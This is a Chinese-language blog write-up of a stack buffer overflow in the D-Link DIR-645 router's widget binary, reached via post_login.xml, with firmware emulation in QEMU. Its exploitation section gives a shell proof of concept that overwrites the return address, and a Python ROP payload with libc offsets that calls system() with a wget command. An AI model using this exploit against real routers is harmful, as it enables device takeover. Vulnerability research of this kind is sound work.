---
layout: post
title: "D-Link DIR-645 post_login.xml BoF"
---

# 0x00 背景

在看《揭秘家用路由器0day漏洞挖掘技术》这本书时，头两个讲了D-Link DIR-815和DIR-645的漏洞，在看[exploit-db](https://www.exploit-db.com/exploits/33862/)上相关利用时，可以发现[公告](http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt)中还有一个DIR-645 post_login.xml的栈溢出漏洞，本文就稍作分析利用漏洞点：

<!-- more -->

![][1]

# 0x01 搭建环境

* 操作系统：Kali 2017.2
* 交叉编译：gcc-multilib-mips-linux-gnu、gcc-multilib-mipsel-linux-gnu、gcc-multilib-mips64-linux-gnuabi64、gcc-multilib-mips64el-linux-gnuabi64
* 仿真环境：qemu-user-static、qemu-system-mips
* 固件下载：台湾官网[DIR645A1_FW103B11.zip](http://www.dlinktw.com.tw/techsupport/download.ashx?file=1642)
* binwalk[依赖](https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md)：[sasquatch](https://github.com/devttys0/sasquatch)

安装sasquatch时会出现[./build.sh failed on Kali](https://github.com/devttys0/sasquatch/issues/21)问题，但issue中也有解决方案，binwalk解得固件和书中相同：

![][2]

# 0x02 漏洞原理

首先看看post_login.xml的认证原理：

![][3]

大意就是，接收GET请求传递的hash值并写入`/var/run/hash`文件，获取内部password写入`/var/run/password`，通过`/runtime/widgetv2/logincheck`决定login是否ok。公告中与此联系的binary是`/usr/sbin/widget`，file后直接IDA打开：

![][4]

程序比较小，使用[getopt函数](https://www.cnblogs.com/qingergege/p/5914218.html)处理参数选项，switch跳转执行不同功能，使用qemu模拟执行也可以知道其大致功能：

![][5]

简单的逆向分析后可知-a选项可使得`$s0=1`进而转入`00400C60`的逻辑，`00400C80`调用的函数接收两个参数，一个是之前写入的`/var/run/hash`文件，一个是栈上的地址`0x3A8+var_128`，自然联想这里可能是将我们传入的hash值copy至栈上，而且没有做长度限制就导致了栈溢出：

![][6]

跟进函数，内部open文件后，根据文件的size直接read至栈上，很明显的栈溢出了：

![][7]

有一个小细节是程序调用了两次widget_fread函数，第二次接收的文件应该是之前生成的文件`/var/run/password`，当后面在简单复现时需要生成该文件，不然在widget_fread中会因无法打开文件直接exit：

![][8]

# 0x03 漏洞利用

从var_128处开始溢出，$ra保存在var_4处，所以292字节后即可覆盖$ra，和公告描述一致，这里我人工打入hash、password两个文件，然后用qemu模拟调试执行：

```shell
mkdir -p ./var/run
python -c 'print "A"*292+"BBBB"' | tr -d '\n' > ./var/run/hash
python -c 'print "C"*32' | tr -d '\n' > ./var/run/password
cp $(which qemu-mipsel-static) .
chroot . ./qemu-mipsel-static -g 4444 /usr/sbin/widget -a /var/run/password
rm ./qemu-mipsel-static
rm -fr ./var/run
```

F4运行至跳转$ra处，可以看到$s0~$s7、$fp、$ra都是可以被我们控制的：

![][9]

我们默认这里是没有开启ASLR的，对于libuClibc基址的获取，可以在IDA运行至`la $t9, memset`指令，查看对应寄存器减去偏移就好，在qemu-mipsel-static下获取的基址为0x7f738000，rop链也是在书中提到过的：

![][10]

转化为代码如下：

```python
import struct

def p32(i):
    return struct.pack('<I', i)

qemu_libc = 0x7f738000
# qemu_sys_libc = 0x77f34000
# router_libc = 0x2aaf8000
system = 0x00053200
calc_system = 0x000158C8
call_system = 0x000159CC

shellcode = "A" * 0x100 # padding
shellcode += p32(qemu_libc+system-1) # $s0
shellcode += "A" * 0x10 # $s1 ~ $s4
shellcode += p32(qemu_libc+call_system) # $s5
shellcode += "A" * 0x0c # $s6 $s7 $fp
shellcode += p32(qemu_libc+calc_system) # $ra
shellcode += "A" * 0x10 # padding
shellcode += "wget http://127.0.0.1:4444" # cmd

print shellcode
```

本地exploit的效果如下：

![][11]

# 0x04 Qemu模拟

出于好奇，也想通过qemu搭建一个mipsel架构的system，在系统上试一下本地利用。首先是下载对应的[镜像](https://people.debian.org/~aurel32/qemu/mipsel/)，就可以起一个系统了：

```shell
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0"
```

其次面临的问题是传文件至guest，根据官方[wiki](https://wiki.qemu.org/Documentation/Networking)，我们可以在启动系统时使用端口转发，把guest的22端口转发至host的任意端口，然后就可以scp了：

```shell
-device e1000,netdev=net0
-netdev user,id=net0,hostfwd=tcp::5555-:22

ssh localhost -p 5555
```

其实qemu起的系统默认网络走的是nat，而且无法使用ping来测试网络，但是可以通过ip 10.0.2.2来访问到host，所以在host端起个SimpleHTTPServer，在guest端wget也是可以传文件的。如果你就是想桥接tap0，可以参看[Setting up Qemu with a tap interface](https://gist.github.com/extremecoders-re/e8fd8a67a515fee0c873dcafc81d811c)。

最后的问题就是调试和基址了，下载静态编译好的[gdbserver](https://github.com/mzpqnxow/gdb-static-cross/blob/master/prebuilt-static/gdbserver-7.7.1-mipsel-mips32-v1)，使用启动系统时的端口转发，就可以在host上调试guest里面的程序了：

![][12]

# 0x06 相关参考

* [Vivotek 摄像头远程栈溢出漏洞分析及利用](https://paper.seebug.org/480/)

[1]: https://wx4.sinaimg.cn/large/ee2fecafly1frdkc0lybuj20ha07d74e.jpg
[2]: https://wx3.sinaimg.cn/large/ee2fecafly1frdkc49nbyj20k008kgrg.jpg
[3]: https://wx4.sinaimg.cn/large/ee2fecafly1frdkcaa2vkj20k10gi48c.jpg
[4]: https://wx2.sinaimg.cn/large/ee2fecafly1frdkccbsg4j20kh0doq3l.jpg
[5]: https://wx4.sinaimg.cn/large/ee2fecafly1frdkcf8seaj20k005jdjp.jpg
[6]: https://wx4.sinaimg.cn/large/ee2fecafly1frdkcgjex2j21200hd75u.jpg
[7]: https://wx3.sinaimg.cn/large/ee2fecafly1frdkchu6adj20ko0ddaas.jpg
[8]: https://wx3.sinaimg.cn/large/ee2fecafly1frdkciwetnj20ge0anaal.jpg
[9]: https://wx1.sinaimg.cn/large/ee2fecafly1frdkcjvzo8j20kk0fk0tm.jpg
[10]: https://wx1.sinaimg.cn/large/ee2fecafly1frdkckqrs4j20mu0c8mxl.jpg
[11]: https://wx1.sinaimg.cn/large/ee2fecafly1frdkcugcjyj214k0en7nj.jpg
[12]: https://wx2.sinaimg.cn/large/ee2fecafly1frdkcwtespj20kl0gwq6h.jpg
